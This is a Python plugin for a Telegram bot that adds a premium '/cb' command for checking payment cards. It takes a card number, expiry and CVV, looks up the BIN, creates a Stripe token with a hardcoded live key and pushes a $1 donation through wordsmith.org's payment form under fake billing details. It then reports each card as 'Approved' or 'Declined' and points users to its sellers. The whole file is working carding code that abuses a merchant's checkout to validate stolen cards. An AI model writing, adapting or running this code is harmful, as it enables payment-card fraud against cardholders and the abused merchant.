from configss._def_main_ import * 

@Client.on_message(filters.command(["cb"], ["/", "."]))
async def sv(_, message: Message):
    
    with open(file='plugins/rangos/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b> 𝙐𝙨𝙚 <code>/cb card</code></b>")
                return

            ccs  = data[1]
            card = re.split(r'[|/:]', ccs)
            tiempoinicio = time.perf_counter()
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b> 𝙐𝙨𝙚 <code>/cb card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            ano = low_ano(ano)
            rank = get_user_rank(message.from_user.id)
            req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            
            tiempofinal = time.perf_counter()
            msg=await message.reply(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝘾𝙝𝙚𝙠𝙚𝙖𝙣𝙙𝙤 🔴 1.0(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code> 
┣ • 𝘽𝘼𝙉𝙆 : {bank} 
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

            data = 'time_on_page=19297&guid=82ab7260-fe8b-42ae-b243-6c3bb9ae6f6aeb0168&muid=3b4606fa-fbfb-4dbe-b23a-14462262a051886190&sid=fa685f04-7cd1-4481-bfaf-324e027cb86dc41f53&key=pk_live_rLnTHKWmLt3dVcKCiyrE8oqT&payment_user_agent=stripe.js%2F78ef418&card[number]='+cc+'&card[cvc]='+cvv+'&card[exp_month]='+mes+'&card[exp_year]='+ano
            response1 = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            json_first = json.loads(response1.text)
            if 'error' in json_first:
                text = f"""<b>↳ 𝗣𝗔𝗜𝗡🔥

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Decline❌</code
┣ •𝙂𝙖𝙩𝙚 = stripe auth 
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code> 
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code> 
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code> 
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT 
┗━━━━━━━━━━━━━━━━━━━━"""
                await msg.edit_text(text)
            elif 'id' not in json_first:
                text = f"""<b>↳  𝗣𝗔𝗜𝗡🔥

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Decline❌</code
┣ •𝙂𝙖𝙩𝙚 = stripe auth 
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code> 
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code> 
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code> 
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT 
┗━━━━━━━━━━━━━━━━━━━━"""
                await msg.edit_text(text)
            else:
                idw = json_first["id"]

                msg1=await msg.edit(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝘾𝙝𝙚𝙠𝙚𝙖𝙣𝙙𝙤 🟠 4.40(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank}
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")


                cookies = {
    '__stripe_mid': '3b4606fa-fbfb-4dbe-b23a-14462262a051886190',
    '__stripe_sid': 'fa685f04-7cd1-4481-bfaf-324e027cb86dc41f53',
}

                headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '__stripe_mid=3b4606fa-fbfb-4dbe-b23a-14462262a051886190; __stripe_sid=fa685f04-7cd1-4481-bfaf-324e027cb86dc41f53',
    'Origin': 'https://wordsmith.org',
    'Referer': 'https://wordsmith.org/contribute/payment.php?amount=1&payment=undefined',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
                params = {
    'amount': '1',
    'payment': 'undefined',
}
                data = {
    'payment_type': 'undefined',
    'total_amount': '1',
    'gift': 'none',
    'first_name': 'BSLINUX',
    'last_name': 'BS',
    'street': 'sbsbs',
    'city': 'NEW YORK',
    'state': 'New York',
    'postalcode': '10080',
    'country': 'مصر',
    'email_address': 'bslinux079@gmail.com',
    'card_number': '5154 6200 5533 2330',
    'mm': mes,
    'yy': ano,
    'cvv': cvv,
    'comments': 'Hossam Reda',
    'stripeToken': idw,
}
                
                response2 = requests.post('https://wordsmith.org/contribute/payment.php', params=params, cookies=cookies, headers=headers, data=data)
                
                
                
                msg2=await msg1.edit(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝘾𝙝𝙚𝙠𝙚𝙖𝙣𝙙𝙤 🟢 6.20(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank}
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")

                
                if 'Your card was declined.' in response2.text:
                    await msg2.edit(f"""<b>↳ 𝗣𝗔𝗜𝗡🔥

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your card was declined</code
┣ •𝙂𝙖𝙩𝙚 = stripe auth 
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code> 
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code> 
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code> 
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT 
┗━━━━━━━━━━━━━━━━━━━━""")
                    
                elif"Your card's security code is incorrect." in response2.text:
                    await msg2.edit(f"""<b>↳ 𝗣𝗔𝗜𝗡🔥

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your card was declined</code
┣ •𝙂𝙖𝙩𝙚 = stripe auth 
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code> 
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code> 
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code> 
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT 
┗━━━━━━━━━━━━━━━━━━━━""")
                elif 'Your card has insufficient funds.' in response2.text:
                    await msg2.edit(f"""<b>↳ 𝗣𝗔𝗜𝗡🔥

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your card has insufficient funds</code
┣ •𝙂𝙖𝙩𝙚 = stripe auth 
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code> 
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code> 
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code> 
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT 
┗━━━━━━━━━━━━━━━━━━━━""")

                elif 'Your card number is incorrect.' in response2.text:
                    await msg2.edit(f"""<b>↳ 𝗣𝗔𝗜𝗡🔥

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your card number is incorrect</code
┣ •𝙂𝙖𝙩𝙚 = stripe auth 
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code> 
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code> 
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code> 
┗━━━━━━━━━━━━━━━━━━━━ 
┏━━━━━━━━━━━━━━━━━━━━ 
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code> 
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT 
┗━━━━━━━━━━━━━━━━━━━━""")
                elif 'succeed' in response2.text:
                    await msg2.edit(f"""<b>↳ 𝗣𝗔𝗜𝗡🔥

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code>
┣ •𝙂𝙖𝙩𝙚 = <code>stripe auth </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━""")

                else:
                    await msg2.edit(f"""<b>↳ 𝗣𝗔𝗜𝗡🔥

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code>
┣ •𝙂𝙖𝙩𝙚 = <code>stripe auth </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━""")
        
      
        else:
            return await message.reply(f'<b>𝘾𝙝𝙖𝙩 𝙣𝙤 𝙖𝙪𝙩𝙤𝙧𝙞𝙯𝙖𝙙𝙤 𝙊 𝙉𝙤 𝙀𝙧𝙚𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙚 𝘾𝙤𝙣 𝙡𝙤𝙨 𝙎𝙚𝙡𝙡𝙚𝙧 𝙤 𝙊𝙬𝙣𝙚𝙧</b>',
reply_markup=InlineKeyboardMarkup(

        [

            [
        
                InlineKeyboardButton("𝙊𝙒𝙉𝙀𝙍", url="t.me/THE_ORGULLOT"),
        ],

        [        

                InlineKeyboardButton("𝙊𝙒𝙉𝙀𝙍", url="t.me/Swnfloxs"),

                InlineKeyboardButton("𝙎𝙀𝙇𝙇𝙀𝙍", url="t.me/CAMILO10B"),
                
            ]
            
        ]

    )
    
 )        